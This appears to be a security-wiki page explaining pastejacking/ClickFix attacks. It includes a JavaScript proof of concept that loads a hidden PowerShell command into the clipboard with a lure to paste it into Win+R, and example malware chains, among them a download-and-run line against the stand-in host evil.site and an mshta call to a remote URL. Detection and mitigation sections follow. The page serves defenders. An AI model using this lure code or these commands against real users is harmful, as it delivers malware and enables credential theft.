# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – old but still valid advice

## Overview

Clipboard hijacking – also known as *pastejacking* – abuses the fact that users routinely copy-and-paste commands without inspecting them. A malicious web page (or any JavaScript-capable context such as an Electron or Desktop application) programmatically places attacker-controlled text into the system clipboard. Victims are encouraged, normally by carefully crafted social-engineering instructions, to press **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), or open a terminal and *paste* the clipboard content, immediately executing arbitrary commands.

Because **no file is downloaded and no attachment is opened**, the technique bypasses most e-mail and web-content security controls that monitor attachments, macros or direct command execution. The attack is therefore popular in phishing campaigns delivering commodity malware families such as NetSupport RAT, Latrodectus loader or Lumma Stealer.

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake Flow

1. User visits a typosquatted or compromised site (e.g. `docusign.sa[.]com`)
2. Injected **ClearFake** JavaScript calls an `unsecuredCopyToClipboard()` helper that silently stores a Base64-encoded PowerShell one-liner in the clipboard.
3. HTML instructions tell the victim to: *“Press **Win + R**, paste the command and press Enter to resolve the issue.”*
4. `powershell.exe` executes, downloading an archive that contains a legitimate executable plus a malicious DLL (classic DLL sideloading).
5. The loader decrypts additional stages, injects shellcode and installs persistence (e.g. scheduled task) – ultimately running NetSupport RAT / Latrodectus / Lumma Stealer.

### Example NetSupport RAT Chain

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (legitimate Java WebStart) searches its directory for `msvcp140.dll`.
* The malicious DLL dynamically resolves APIs with **GetProcAddress**, downloads two binaries (`data_3.bin`, `data_4.bin`) via **curl.exe**, decrypts them using a rolling XOR key `"https://google.com/"`, injects the final shellcode and unzips **client32.exe** (NetSupport RAT) to `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Downloads `la.txt` with **curl.exe**
2. Executes the JScript downloader inside **cscript.exe**
3. Fetches an MSI payload → drops `libcef.dll` besides a signed application → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## Detection & Hunting

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:
  {{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}